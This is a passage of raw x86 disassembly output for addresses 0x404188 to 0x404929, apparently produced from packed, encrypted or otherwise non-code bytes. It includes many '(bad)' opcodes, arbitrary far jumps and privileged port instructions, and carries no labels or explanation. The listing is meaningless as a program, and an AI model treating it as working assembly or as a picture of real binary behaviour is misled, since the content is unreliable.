  404188:	or     cl,BYTE PTR [esi+0x6a758f58]
  40418e:	push   ebp
  40418f:	ins    BYTE PTR es:[edi],dx
  404190:	test   BYTE PTR [ebp-0x56],dh
  404193:	or     bh,BYTE PTR [edx]
  404195:	adc    al,0x34
  404197:	push   ebx
  404198:	aam    0xd6
  40419a:	sub    al,0x3c
  40419c:	ja     0x4041ac
  40419e:	pop    ebp
  40419f:	outs   dx,BYTE PTR ds:[esi]
  4041a0:	imul   esi,DWORD PTR [ebp-0x687822cf],0x45
  4041a7:	int    0xfa
  4041a9:	fs jecxz 0x4041a8
  4041ac:	cmp    al,0x11
  4041ae:	sbb    edx,DWORD PTR [edx]
  4041b0:	shl    ch,1
  4041b2:	sbb    BYTE PTR [edx],ch
  4041b4:	dec    edx
  4041b5:	loop   0x404147
  4041b7:	jns    0x40415b
  4041b9:	sbb    eax,0xd06735d1
  4041be:	retf   
  4041bf:	add    BYTE PTR [ebp+0x7b],ah
  4041c2:	pop    edi
  4041c3:	std    
  4041c4:	adc    bh,bh
  4041c6:	mov    edi,0x54b0a591
  4041cb:	pop    ebp
  4041cc:	clc    
  4041cd:	loopne 0x40419a
  4041cf:	cdq    
  4041d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041d1:	mov    bh,0x1e
  4041d3:	cmp    eax,0xc00bdab2
  4041d8:	jb     0x4041b6
  4041da:	jns    0x404224
  4041dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041de:	out    dx,al
  4041df:	scas   al,BYTE PTR es:[edi]
  4041e0:	mov    ds:0xbb5a094b,eax
  4041e5:	mov    ds:0x18f1a72,eax
  4041ea:	stos   DWORD PTR es:[edi],eax
  4041eb:	popf   
  4041ec:	sub    DWORD PTR [esi+eiz*1],esi
  4041ef:	push   ecx
  4041f0:	xor    ecx,DWORD PTR [esi+0xb91c432]
  4041f6:	call   0x44ee:0x42376610
  4041fd:	(bad)  
  4041fe:	(bad)  
  404200:	sbb    BYTE PTR [ebx+0x2a],dl
  404203:	or     BYTE PTR [edi],al
  404205:	adc    eax,0xf304c100
  40420a:	jb     0x4041f9
  40420c:	add    al,0xab
  40420e:	sbb    ah,0x85
  404211:	cmp    DWORD PTR [ebp+0x1f],esp
  404214:	pop    ebp
  404215:	lods   eax,DWORD PTR ds:[esi]
  404216:	inc    esi
  404217:	push   es
  404218:	cmp    ah,BYTE PTR [ebx]
  40421a:	ret    
  40421b:	ret    
  40421c:	jae    0x404218
  40421e:	xchg   DWORD PTR [ecx-0x4b],ebp
  404221:	retf   
  404222:	jnp    0x4041df
  404224:	adc    cl,BYTE PTR [ecx+0x3bc8cc7]
  40422a:	sbb    DWORD PTR [edi],edi
  40422c:	nop
  40422d:	(bad)  
  40422e:	fild   WORD PTR [ebp+0x6b]
  404231:	iret   
  404232:	push   ss
  404233:	pop    es
  404234:	mov    eax,ds:0x7be8cf64
  404239:	push   cs
  40423a:	jg     0x40428a
  40423c:	pop    ss
  40423d:	icebp  
  40423e:	loop   0x40420a
  404240:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404241:	pop    edi
  404242:	cmp    al,0x78
  404244:	pop    ss
  404245:	cwde   
  404246:	jmp    0x40421c
  404248:	push   esi
  404249:	inc    esp
  40424a:	imul   esi,DWORD PTR [esi],0xc4f07d8b
  404250:	(bad)  
  404251:	ror    BYTE PTR [ecx],1
  404253:	sbb    al,0xa
  404255:	iret   
  404256:	jno    0x4041f2
  404258:	push   0xb26daac4
  40425d:	jg     0x40425a
  40425f:	mov    ch,0x18
  404261:	sub    ebp,DWORD PTR [ecx+0x7ea36c53]
  404267:	add    edi,DWORD PTR [edx-0x256be4b]
  40426d:	mov    ebx,0x8faf3ac0
  404272:	js     0x4041fc
  404274:	adc    eax,0xf3800ed7
  404279:	mov    dl,0xa6
  40427b:	sti    
  40427c:	popa   
  40427d:	push   cs
  40427e:	pop    esp
  40427f:	sbb    al,0xf9
  404281:	lea    ebp,[edx]
  404283:	ror    DWORD PTR [esi],0x31
  404286:	mov    al,0x42
  404288:	xchg   edx,eax
  404289:	push   ds
  40428a:	outs   dx,BYTE PTR ds:[esi]
  40428b:	sub    ebx,DWORD PTR [edx]
  40428d:	stos   DWORD PTR es:[edi],eax
  40428e:	js     0x40423f
  404290:	mov    bh,0xad
  404292:	jb     0x4042ee
  404294:	pop    ss
  404295:	das    
  404296:	lods   eax,DWORD PTR ds:[esi]
  404297:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404298:	xor    esp,DWORD PTR [eax+0x7331df81]
  40429e:	xchg   ecx,eax
  40429f:	mov    WORD PTR [ebx],ss
  4042a1:	add    edx,DWORD PTR [ecx+0x7c]
  4042a4:	mov    ah,dh
  4042a6:	fmul   QWORD PTR [edx]
  4042a8:	push   0x70
  4042aa:	pushf  
  4042ab:	ret    0xab6e
  4042ae:	gs fs (bad) 
  4042b1:	and    al,0x2f
  4042b3:	aas    
  4042b4:	cmp    esp,ebp
  4042b6:	mov    ebp,0x8f5d5043
  4042bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042bc:	or     al,0x3
  4042be:	inc    edi
  4042bf:	lea    eax,[eax]
  4042c1:	push   ecx
  4042c2:	lahf   
  4042c3:	push   es
  4042c4:	ja     0x404260
  4042c6:	arpl   WORD PTR [eax],bx
  4042c8:	xchg   ebx,eax
  4042c9:	repz xchg edi,edi
  4042cc:	xchg   BYTE PTR [ecx+0x1ffe9487],dl
  4042d2:	dec    esi
  4042d3:	lock and eax,0x75fe364a
  4042d9:	loope  0x404340
  4042db:	jne    0x4042ee
  4042dd:	mov    dl,0x6c
  4042df:	fcomp  QWORD PTR [ebx-0x707da4c5]
  4042e5:	and    al,0xce
  4042e7:	fidivr WORD PTR [edx+0x3b7db605]
  4042ed:	hlt    
  4042ee:	retf   0xe02c
  4042f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042f2:	jg     0x404311
  4042f4:	call   0xa974:0xe9b08c4c
  4042fb:	xor    al,0x85
  4042fd:	xchg   esp,eax
  4042fe:	bswap  edx
  404300:	out    0x16,al
  404302:	inc    esi
  404303:	or     al,0x53
  404305:	jbe    0x4042ce
  404307:	jp     0x4042c3
  404309:	call   0x6b0b0b7c
  40430e:	repnz push ecx
  404310:	rol    DWORD PTR [eax+0x5d251557],0x4f
  404317:	fldcw  WORD PTR [eax]
  404319:	outs   dx,BYTE PTR ds:[esi]
  40431a:	repz xor BYTE PTR [eax-0x5e],bh
  40431e:	add    ecx,edi
  404320:	mov    bl,0x1a
  404322:	cdq    
  404323:	fstp   TBYTE PTR [ebp+edx*4+0xfd860dd]
  40432a:	aam    0x16
  40432c:	daa    
  40432d:	inc    ebx
  40432e:	mov    dl,BYTE PTR [edx]
  404330:	xor    dl,BYTE PTR [eax+0x75d588ab]
  404336:	js     0x404321
  404338:	(bad)  
  404339:	xchg   esp,eax
  40433a:	dec    ebp
  40433b:	mov    ebx,0xae876506
  404340:	jecxz  0x40437b
  404342:	inc    ebx
  404343:	jmp    eax
  404345:	push   es
  404346:	repz xchg ebx,eax
  404348:	xor    edi,DWORD PTR [esi+0x2ced72d1]
  40434e:	rcr    esi,0xb5
  404351:	jo     0x404377
  404353:	fwait
  404354:	jae    0x4043cb
  404356:	popa   
  404357:	loopne 0x40433d
  404359:	fiadd  DWORD PTR [ebx]
  40435b:	cld    
  40435c:	sub    BYTE PTR [edi+0x6f],dl
  40435f:	pop    esp
  404360:	mov    bl,0x83
  404362:	scas   eax,DWORD PTR es:[edi]
  404363:	xor    esi,ecx
  404365:	ins    BYTE PTR es:[edi],dx
  404366:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404367:	mov    dl,0x31
  404369:	xchg   BYTE PTR [ecx+0x0],bh
  40436c:	cmp    DWORD PTR [eax-0x5bca9ed7],ebx
  404372:	js     0x404389
  404374:	repz add BYTE PTR [esi+0xf144f5b],al
  40437b:	ret    
  40437c:	pop    ebp
  40437d:	jno    0x40434c
  40437f:	jne    0x404377
  404381:	nop
  404382:	imul   ebx,esi,0xbf42e30
  404388:	push   ecx
  404389:	sbb    BYTE PTR [ebp-0x4c],ch
  40438c:	xchg   ecx,eax
  40438d:	(bad)  
  40438e:	sbb    bl,BYTE PTR [edi]
  404390:	xchg   esp,eax
  404391:	inc    DWORD PTR [edx]
  404393:	mov    bh,ah
  404395:	mov    ebx,0x1bcc7f65
  40439a:	retf   0xd91a
  40439d:	jmp    0x4043ce
  40439f:	mov    al,ds:0x13b82a7e
  4043a4:	dec    ebp
  4043a5:	jl     0x4043b3
  4043a7:	push   eax
  4043a8:	push   es
  4043a9:	fs xchg ebx,eax
  4043ab:	repnz push ebx
  4043ad:	jmp    0x404372
  4043af:	push   esp
  4043b0:	loope  0x4043e2
  4043b2:	shr    DWORD PTR [eax-0x65],0x8e
  4043b6:	jne    0x4043c1
  4043b8:	out    dx,al
  4043b9:	cld    
  4043ba:	sub    al,0x9d
  4043bc:	dec    ecx
  4043bd:	cmp    al,cl
  4043bf:	test   eax,0x8a3799fe
  4043c4:	ja     0x404405
  4043c6:	pop    eax
  4043c7:	out    dx,al
  4043c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043c9:	pop    esp
  4043ca:	jnp    0x4043de
  4043cc:	mov    ebp,esi
  4043ce:	pop    ebx
  4043cf:	dec    eax
  4043d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043d1:	in     al,dx
  4043d2:	xchg   edi,eax
  4043d3:	iret   
  4043d4:	push   0x3b
  4043d6:	cwde   
  4043d7:	cwde   
  4043d8:	vfmsubps xmm5,xmm6,XMMWORD PTR [eax+0x3c396daa],xmm0
  4043e2:	scas   eax,DWORD PTR es:[edi]
  4043e3:	cdq    
  4043e4:	out    0xa0,al
  4043e6:	pop    edx
  4043e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043e8:	mov    ds:0xdc92c26,eax
  4043ed:	ins    BYTE PTR es:[edi],dx
  4043ee:	enter  0x5dd1,0xd3
  4043f2:	mov    ds:0x96df252b,al
  4043f7:	ret    
  4043f8:	das    
  4043f9:	sti    
  4043fa:	jo     0x40440d
  4043fc:	xlat   BYTE PTR ds:[ebx]
  4043fd:	fisub  DWORD PTR ds:0xf1e79af0
  404403:	or     dl,BYTE PTR [esi+0x6e]
  404406:	jp     0x4043c7
  404408:	ret    0x96b0
  40440b:	std    
  40440c:	jns    0x4043f5
  40440e:	jno    0x404396
  404410:	adc    DWORD PTR [edx+eax*4-0x7bb0db96],0x8d7c4da5
  40441b:	scas   al,BYTE PTR es:[edi]
  40441c:	sti    
  40441d:	ret    0xcb32
  404420:	push   esp
  404421:	idiv   BYTE PTR [ecx+0x68]
  404424:	cdq    
  404425:	mov    cl,0xab
  404427:	into   
  404428:	cs popa 
  40442a:	mov    DWORD PTR [eax+0x4],0xdf9bb607
  404431:	call   0x5dc4:0xd6c96eef
  404438:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404439:	jl     0x404494
  40443b:	xor    BYTE PTR [esi],bl
  40443d:	push   ss
  40443e:	fwait
  40443f:	aaa    
  404440:	aaa    
  404441:	les    edi,FWORD PTR [ebp+0x2b]
  404444:	sub    esi,DWORD PTR [edi]
  404446:	mov    dh,0x1a
  404448:	aaa    
  404449:	lahf   
  40444a:	test   BYTE PTR [eax],bl
  40444c:	inc    edi
  40444d:	loop   0x40442a
  40444f:	in     al,dx
  404450:	add    DWORD PTR [edi-0x6df503fa],eax
  404456:	cmp    BYTE PTR [edx],bl
  404458:	cwde   
  404459:	pop    es
  40445a:	add    ebp,esp
  40445c:	ja     0x404436
  40445e:	fistp  DWORD PTR [eax+0x64755f1c]
  404464:	lods   al,BYTE PTR ds:[esi]
  404465:	enter  0x6e8c,0xab
  404469:	jmp    0x65ff9922
  40446e:	test   eax,0x61fadffa
  404473:	sbb    al,0xae
  404475:	pusha  
  404476:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404477:	add    esp,ebx
  404479:	add    esi,esp
  40447b:	cmp    eax,0x6c70c3a8
  404480:	out    dx,al
  404481:	mov    WORD PTR [esi-0x36],ds
  404484:	add    ah,BYTE PTR [ebp-0x47]
  404487:	mov    ebp,0x372fe89d
  40448c:	xchg   esi,eax
  40448d:	jmp    0x40442c
  40448f:	retf   0x2e01
  404492:	mov    al,0xed
  404494:	dec    edx
  404495:	cdq    
  404496:	pop    ecx
  404497:	int    0x11
  404499:	fcom   DWORD PTR [ebx]
  40449b:	cmp    eax,ecx
  40449d:	cmc    
  40449e:	sub    BYTE PTR [edi],bl
  4044a0:	lds    edi,FWORD PTR [eax+eax*2+0x36d676a7]
  4044a7:	fs push ss
  4044a9:	into   
  4044aa:	push   eax
  4044ab:	push   ebp
  4044ac:	popf   
  4044ad:	aaa    
  4044ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044af:	bound  ecx,QWORD PTR [edi+0x35]
  4044b2:	mov    ecx,0x2f374efd
  4044b7:	mov    ebp,0x18aab53c
  4044bc:	fcom   DWORD PTR [edx-0x16a828d0]
  4044c2:	xor    DWORD PTR [ecx-0x6b914228],edx
  4044c8:	aas    
  4044c9:	inc    ecx
  4044ca:	retf   
  4044cb:	xchg   ebx,eax
  4044cc:	mov    ds:0x2d5bd675,al
  4044d1:	(bad)  
  4044d2:	scas   eax,DWORD PTR es:[edi]
  4044d3:	shr    BYTE PTR [ecx],cl
  4044d5:	cmp    bh,ah
  4044d7:	fs pusha 
  4044d9:	adc    DWORD PTR [esi],edi
  4044db:	adc    bl,BYTE PTR [eax]
  4044dd:	cmp    al,0x37
  4044df:	daa    
  4044e0:	mov    ecx,0xc7468e8
  4044e5:	in     al,dx
  4044e6:	pusha  
  4044e7:	sub    ecx,DWORD PTR [eax+ebx*8]
  4044ea:	scas   eax,DWORD PTR es:[edi]
  4044eb:	pushf  
  4044ec:	jecxz  0x404521
  4044ee:	sbb    edx,edi
  4044f0:	bound  ebp,QWORD PTR [ebp-0x72]
  4044f3:	stc    
  4044f4:	cmp    DWORD PTR [ecx+0x429635cd],ebx
  4044fa:	fld    DWORD PTR [edi]
  4044fc:	in     eax,0xe
  4044fe:	fsubr  DWORD PTR [eax-0x65]
  404501:	push   cs
  404502:	leave  
  404503:	adc    cl,0x39
  404506:	(bad)  
  404508:	ret    
  404509:	add    eax,0x5c2fb5da
  40450e:	adc    bl,BYTE PTR [ebp-0x4c]
  404511:	pop    ebp
  404512:	adc    ebx,DWORD PTR [eax-0x284bd94e]
  404518:	clc    
  404519:	test   al,0xef
  40451b:	jae    0x404532
  40451d:	or     DWORD PTR [esi],edx
  40451f:	stc    
  404520:	adc    al,0xf9
  404522:	ss std 
  404524:	mov    ds:0x90631171,eax
  404529:	test   eax,0xa6eb015
  40452e:	add    BYTE PTR [edx+0x2f96931f],bh
  404534:	jae    0x40451e
  404536:	bound  edi,QWORD PTR [edx-0x6b8b1f8c]
  40453c:	shl    DWORD PTR [esi],1
  40453e:	mov    edi,cs
  404540:	ffreep st(7)
  404542:	out    dx,eax
  404543:	ds push esi
  404545:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404546:	frstor [eax+0x82cee95]
  40454c:	mov    al,0x4b
  40454e:	xlat   BYTE PTR ds:[ebx]
  40454f:	mov    esp,0x56f8fd89
  404554:	mov    eax,0x6bc035fa
  404559:	into   
  40455a:	mov    BYTE PTR [edx-0x48],ch
  40455d:	lock sub al,0x1f
  404560:	xchg   esi,eax
  404561:	inc    ecx
  404562:	ds retf 0xc5ce
  404566:	dec    esp
  404567:	mov    edx,0x45aa5349
  40456c:	aaa    
  40456d:	inc    esp
  40456e:	and    bl,BYTE PTR ss:[edx-0x601ecaa1]
  404575:	sbb    edi,DWORD PTR [eax+eax*2-0x23c04ca5]
  40457c:	mov    fs,WORD PTR [ebp+0xf48fb59]
  404582:	dec    edx
  404583:	je     0x404510
  404585:	jne    0x404512
  404587:	test   BYTE PTR [edi+0x24f52720],ch
  40458d:	jmp    0x404513
  40458f:	jmp    0xf6cc9bac
  404594:	push   0xd8a3f0b3
  404599:	int3   
  40459a:	jmp    0x404598
  40459c:	repnz sub eax,0xec1c0258
  4045a2:	xchg   edx,eax
  4045a3:	mov    ch,0x7d
  4045a5:	(bad)  
  4045a6:	sbb    bl,bl
  4045a8:	cmp    eax,0x105619e7
  4045ad:	jp     0x4045ba
  4045af:	ret    0xc3d4
  4045b2:	xor    dl,BYTE PTR [ebp+0x2d]
  4045b5:	add    ebp,DWORD PTR fs:[bx+si]
  4045b9:	push   ebp
  4045ba:	jnp    0x404606
  4045bc:	xor    BYTE PTR [esp+ebp*4+0x59],0x6a
  4045c1:	mov    esp,0x65787ff6
  4045c6:	mov    bh,0x50
  4045c8:	and    ch,BYTE PTR [edx]
  4045ca:	add    DWORD PTR [eax+ebx*2],esi
  4045cd:	mov    dl,0x2b
  4045cf:	or     edx,DWORD PTR [edi]
  4045d1:	or     esp,ecx
  4045d3:	iret   
  4045d4:	imul   ecx,edx,0xb9ff22a0
  4045da:	inc    edx
  4045db:	push   ds
  4045dc:	pop    esp
  4045dd:	aam    0xcf
  4045df:	inc    esp
  4045e0:	sar    DWORD PTR [edx-0x6f],1
  4045e3:	push   ecx
  4045e4:	add    bh,BYTE PTR [esi-0x2c]
  4045e7:	jno    0x40456b
  4045e9:	mov    ds:0x68e35cc2,al
  4045ee:	sbb    DWORD PTR [edi+ecx*4],esp
  4045f1:	pop    edi
  4045f2:	cmc    
  4045f3:	popa   
  4045f4:	cdq    
  4045f5:	dec    ebp
  4045f6:	jo     0x4045d0
  4045f8:	pop    esi
  4045f9:	mov    DWORD PTR [ecx+0x5915ab89],ebp
  4045ff:	and    bl,BYTE PTR [edx]
  404601:	pop    ecx
  404602:	jnp    0x404663
  404604:	cmp    al,0xa7
  404606:	out    dx,al
  404607:	mov    ah,0x5d
  404609:	mov    al,ds:0xb7475122
  40460e:	mov    bl,0x3e
  404610:	push   0x6bd93fd8
  404615:	cli    
  404616:	push   edx
  404617:	pop    ebx
  404618:	xchg   esi,eax
  404619:	call   0x2a4d98c5
  40461e:	jno    0x404696
  404620:	mov    dh,BYTE PTR [edx-0x6552fa38]
  404626:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404627:	pop    ss
  404628:	mov    al,ds:0xa7dd81fd
  40462d:	sub    eax,0x6372e899
  404632:	data16 add ch,BYTE PTR [edx+0x5bbb828e]
  404639:	test   bh,ah
  40463b:	push   esp
  40463c:	pop    ebp
  40463d:	and    bh,BYTE PTR [esi+0x57]
  404640:	loop   0x404625
  404642:	pop    ecx
  404643:	shl    BYTE PTR [eax+eax*8-0x3a314952],1
  40464a:	jne    0x40469f
  40464c:	js     0x404615
  40464e:	nop
  40464f:	cmp    esp,DWORD PTR [edi+0x41bb04c8]
  404655:	dec    ecx
  404656:	int    0x6c
  404658:	push   edi
  404659:	js     0x404681
  40465b:	inc    esp
  40465c:	sub    BYTE PTR [edx+ecx*2+0x3e34a28],bh
  404663:	xchg   ebx,eax
  404664:	repnz pop ebx
  404666:	bound  ebp,QWORD PTR [eax+0x5f]
  404669:	ja     0x404607
  40466b:	(bad)  
  40466d:	lock mov al,ds:0x67334979
  404673:	repz or DWORD PTR [edx+0x2e815646],esi
  40467a:	push   0x905ad16b
  40467f:	adc    BYTE PTR [eax],bh
  404681:	fstp   QWORD PTR [edx+0x31]
  404684:	pop    ss
  404685:	push   ds
  404686:	test   eax,0x2aa6b8f1
  40468b:	jp     0x40467f
  40468d:	pop    edi
  40468e:	or     esi,ebx
  404690:	scas   eax,DWORD PTR es:[edi]
  404691:	ret    
  404692:	xchg   BYTE PTR [edi],dl
  404694:	scas   al,BYTE PTR es:[edi]
  404695:	(bad)  
  404696:	test   eax,0xb47f4e00
  40469b:	mov    eax,ds:0x81dbed24
  4046a0:	sbb    bl,BYTE PTR [ecx+eiz*2]
  4046a3:	enter  0xd1e7,0xbb
  4046a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046a8:	mov    ds:0xec3d1b50,eax
  4046ad:	dec    ecx
  4046ae:	lds    edi,FWORD PTR [edx]
  4046b0:	lods   al,BYTE PTR ds:[esi]
  4046b1:	aaa    
  4046b2:	jbe    0x404702
  4046b4:	call   0xb1fc:0x2940adf4
  4046bb:	mov    ebx,0x1ec8148f
  4046c0:	adc    BYTE PTR [ebx-0x3f],bh
  4046c3:	shl    eax,cl
  4046c5:	pop    es
  4046c6:	(bad)  
  4046c7:	jb     0x404728
  4046c9:	pop    esi
  4046ca:	outs   dx,DWORD PTR ds:[si]
  4046cc:	mov    eax,?
  4046ce:	xchg   esp,eax
  4046cf:	push   cs
  4046d0:	push   ebx
  4046d1:	mov    eax,0xc3b615b1
  4046d6:	pop    edi
  4046d7:	jmp    0xd8df:0xa69bfadd
  4046de:	lods   al,BYTE PTR ds:[esi]
  4046df:	das    
  4046e0:	xchg   edi,eax
  4046e1:	sbb    DWORD PTR [esi],0xffffff83
  4046e4:	xchg   DWORD PTR [esi],edx
  4046e6:	shr    DWORD PTR [edx-0x62],0x94
  4046ea:	pusha  
  4046eb:	sbb    eax,0x65d85dfe
  4046f0:	idiv   DWORD PTR [eax+0x6e060e74]
  4046f6:	dec    ebx
  4046f7:	adc    eax,0x88def0df
  4046fc:	mov    al,ds:0x3620fc2e
  404701:	outs   dx,DWORD PTR ds:[esi]
  404702:	mov    bl,0xca
  404704:	mov    bl,0xec
  404706:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404707:	aam    0x23
  404709:	out    dx,eax
  40470a:	mov    eax,0x1645726
  40470f:	mov    ah,0xd3
  404711:	sub    eax,0x33e785b7
  404716:	fs dec ebp
  404718:	mov    ah,0x77
  40471a:	mov    esp,0x7f5faad9
  40471f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404720:	iret   
  404721:	cdq    
  404722:	xchg   esp,eax
  404723:	in     eax,0x87
  404725:	sbb    al,0x60
  404727:	ror    DWORD PTR [ebx-0x5],0x54
  40472b:	xchg   edi,eax
  40472c:	or     esp,DWORD PTR [edi]
  40472e:	push   ss
  40472f:	test   al,0xa
  404731:	cmp    eax,0x6cf80329
  404736:	adc    DWORD PTR [ecx-0x46],edx
  404739:	and    esi,ebx
  40473b:	inc    esp
  40473c:	pushf  
  40473d:	mov    bl,0xe6
  40473f:	push   0xa194a397
  404744:	lock and al,0x3b
  404747:	outs   dx,DWORD PTR ds:[esi]
  404748:	mov    edi,0x6869bd1f
  40474d:	jmp    0x404759
  40474f:	xchg   ebx,eax
  404750:	adc    ebx,DWORD PTR [ebx+0x49]
  404753:	pop    ebx
  404754:	test   BYTE PTR [ebx+0x8],al
  404757:	inc    ebx
  404758:	fnsave [edx-0x766149f2]
  40475e:	nop
  40475f:	jbe    0x404777
  404761:	sub    DWORD PTR [ebp+0x54],ebx
  404764:	mov    ebp,0x5583d0e8
  404769:	stc    
  40476a:	lea    esi,cs:[eax]
  40476d:	mov    ebp,0xd5d5c068
  404772:	mov    al,ds:0xf0f54e66
  404777:	mov    dl,0x67
  404779:	sti    
  40477a:	aam    0x8e
  40477c:	push   ds
  40477d:	mov    al,ds:0xf1a5b77b
  404782:	test   DWORD PTR [ecx],edi
  404784:	pop    DWORD PTR [edi+edx*1+0x50]
  404788:	stc    
  404789:	or     DWORD PTR [esi-0x5a],edx
  40478c:	push   eax
  40478d:	or     eax,0x72aa04a8
  404792:	loop   0x404766
  404794:	jns    0x4047db
  404796:	adc    ah,BYTE PTR [eax+0x926ca2c]
  40479c:	xchg   ch,cl
  40479e:	retf   
  40479f:	fidivr DWORD PTR [ecx]
  4047a1:	add    bh,cl
  4047a3:	jp     0x40481f
  4047a5:	add    dl,BYTE PTR [esi+0x39]
  4047a8:	or     al,0xda
  4047aa:	mov    DWORD PTR [edx-0x3c],0x34b01b28
  4047b1:	jmp    0x4047eb
  4047b3:	pop    ebx
  4047b4:	outs   dx,BYTE PTR ds:[esi]
  4047b5:	pop    es
  4047b6:	push   ebx
  4047b7:	xchg   edx,eax
  4047b8:	int    0x18
  4047ba:	clc    
  4047bb:	rcl    esi,1
  4047bd:	(bad)  
  4047be:	pop    edi
  4047bf:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047c1:	data16 mov dh,0x38
  4047c4:	bound  esp,QWORD PTR [edx+0x76]
  4047c7:	call   0x6076:0x99272faf
  4047ce:	mul    dh
  4047d0:	sbb    DWORD PTR [ebp-0x3e3f324b],0x6c9c0af8
  4047da:	shr    al,cl
  4047dc:	mov    bl,dh
  4047de:	sbb    esi,DWORD PTR [ebx]
  4047e0:	ret    
  4047e1:	jmp    0xdc8:0x2584dc9
  4047e8:	cs out dx,eax
  4047ea:	popf   
  4047eb:	push   ds
  4047ec:	popa   
  4047ed:	push   ebp
  4047ee:	inc    esi
  4047ef:	and    al,0xa6
  4047f1:	inc    esp
  4047f2:	pop    ss
  4047f3:	outs   dx,DWORD PTR ds:[esi]
  4047f4:	rol    DWORD PTR [edx],0x3c
  4047f7:	test   al,0x59
  4047f9:	(bad)  
  4047fa:	in     eax,dx
  4047fb:	frstor [eax+edx*8]
  4047fe:	mov    ebx,0xb84e3249
  404803:	cli    
  404804:	push   0xfffffff4
  404806:	js     0x4047ea
  404808:	or     DWORD PTR gs:[edx],ecx
  40480b:	dec    eax
  40480c:	stos   BYTE PTR es:[edi],al
  40480d:	pop    edx
  40480e:	rcl    edx,cl
  404810:	scas   al,BYTE PTR es:[edi]
  404811:	jle    0x4047f7
  404813:	rcl    DWORD PTR [ebx-0xb54c3ee],1
  404819:	mov    ss:0xf70ddf89,al
  40481f:	xor    BYTE PTR [ecx-0x14],0xfe
  404823:	xor    cl,BYTE PTR [edx-0x21c6e148]
  404829:	imul   esp,DWORD PTR [edi],0x822bfeec
  40482f:	retf   0x8d8
  404832:	popa   
  404833:	not    BYTE PTR [edi]
  404835:	fwait
  404836:	dec    ecx
  404837:	and    eax,0xd929f8e8
  40483c:	retf   
  40483d:	dec    edx
  40483e:	pop    edi
  40483f:	(bad)  
  404840:	outs   dx,DWORD PTR ds:[esi]
  404841:	fimul  DWORD PTR [ecx-0x64]
  404844:	mov    ebp,0x2af27809
  404849:	lods   eax,DWORD PTR ds:[esi]
  40484a:	cmova  esi,DWORD PTR [edx]
  40484d:	cld    
  40484e:	out    dx,al
  40484f:	inc    eax
  404850:	imul   BYTE PTR [ecx+0x108e4561]
  404856:	sub    edi,edx
  404858:	xchg   edx,eax
  404859:	loope  0x404805
  40485b:	xchg   edx,eax
  40485c:	in     al,0xec
  40485e:	sub    eax,0x96f3c90b
  404863:	pusha  
  404864:	ins    DWORD PTR es:[edi],dx
  404865:	or     BYTE PTR [esi-0x750f6fba],ch
  40486b:	imul   ebx,DWORD PTR [edi+0x2f],0xffffffed
  40486f:	mov    dl,dl
  404871:	mov    ch,0xbc
  404873:	ret    0x43cf
  404876:	retf   
  404877:	pop    edi
  404878:	rcl    esi,cl
  40487a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40487b:	or     BYTE PTR [ecx],bl
  40487d:	pop    esi
  40487e:	repnz pop eax
  404880:	pop    edx
  404881:	in     eax,0xdd
  404883:	and    BYTE PTR [esi+0x3ed12279],ah
  404889:	push   ecx
  40488a:	icebp  
  40488b:	cmp    eax,0x54b89daf
  404890:	retf   
  404891:	xor    cl,BYTE PTR [esi+0x4dfea811]
  404897:	popa   
  404898:	jmp    0xbe97:0x5240286b
  40489f:	mov    eax,0x7603cdbc
  4048a4:	push   esp
  4048a5:	push   ds
  4048a6:	sbb    BYTE PTR [ebp+0x2efd8b52],al
  4048ac:	ror    DWORD PTR [ecx+0x703e39c],0xf5
  4048b3:	pop    edi
  4048b4:	mov    esi,0x22ebd43d
  4048b9:	lea    ebp,[eax]
  4048bb:	cli    
  4048bc:	dec    ebp
  4048bd:	in     al,dx
  4048be:	fcmovbe st,st(1)
  4048c0:	retf   
  4048c1:	scas   eax,DWORD PTR es:[edi]
  4048c2:	add    dh,BYTE PTR [edx]
  4048c4:	inc    dh
  4048c6:	stos   DWORD PTR es:[edi],eax
  4048c7:	iret   
  4048c8:	mov    esp,0xb282b427
  4048cd:	cwde   
  4048ce:	sub    ah,BYTE PTR [eax]
  4048d0:	and    esp,ebx
  4048d2:	sar    edx,cl
  4048d4:	cmp    eax,0xab0a6557
  4048d9:	(bad)  
  4048da:	sub    BYTE PTR [edi],dh
  4048dc:	and    al,0x5
  4048de:	push   ebx
  4048df:	jmp    0x404924
  4048e1:	xchg   ecx,eax
  4048e2:	jmp    0xbbdb:0x1e046e7b
  4048e9:	dec    eax
  4048ea:	inc    ebp
  4048eb:	inc    eax
  4048ec:	push   ss
  4048ed:	cmp    bl,BYTE PTR [edi-0xe3d1d16]
  4048f3:	mov    edx,0x5cc4ad02
  4048f8:	adc    ebp,DWORD PTR [ebx+0xc3e06bd]
  4048fe:	add    eax,DWORD PTR [ebp+0x53]
  404901:	adc    bl,cl
  404903:	sub    BYTE PTR [eax-0x7d],cl
  404906:	adc    eax,0xe0a8578f
  40490b:	mov    BYTE PTR [eax+0x652e00d],bh
  404911:	out    0x2,eax
  404913:	and    DWORD PTR [ebp-0x7a9579d2],0x27
  40491a:	inc    esi
  40491b:	out    dx,eax
  40491c:	jmp    0x404929
  40491e:	or     ebx,DWORD PTR [eax+0x2b84ede7]
  404924:	dec    ebx
  404925:	jl     0x40498c
  404927:	mov    edi,ecx
  404929:	sbb    BYTE PTR [bp+di+0xe],al
